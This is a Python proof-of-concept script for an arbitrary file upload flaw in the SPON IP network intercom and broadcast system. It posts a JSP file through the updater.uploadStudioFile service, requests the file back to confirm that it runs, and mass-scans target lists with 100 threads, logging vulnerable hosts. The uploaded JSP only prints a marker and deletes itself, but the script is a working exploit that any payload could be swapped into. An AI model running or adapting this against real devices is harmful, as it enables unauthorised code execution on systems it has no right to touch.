#世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    payload = "/formservice?service=updater.uploadStudioFile"
    payload1 = "/update/temp/studio/ceshi.jsp"
    url = target+payload
    url1 =target+payload1
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip", "Connection": "close"}
    headers1 ={"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    data = {"content": "<?xml version=\"1.0\"?><root><filename>ceshi.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01 08:00:00</lmtime></root><!--<% out.println(\"Hello World!\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>-->"}
    proxies = {
        'http' : 'http://127.0.0.1:8080',
        'https' : 'http://127.0.0.1:8080'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,proxies=proxies,verify=False,timeout=10)
        res1 = requests.get(url=url1,headers=headers1,verify=False,timeout=10)
        if res.status_code == 200 and 'Hello World!' in res1.text:
            print(f'[+]该url{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
        else:
            print(f'该url{target}不存在漏洞')
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()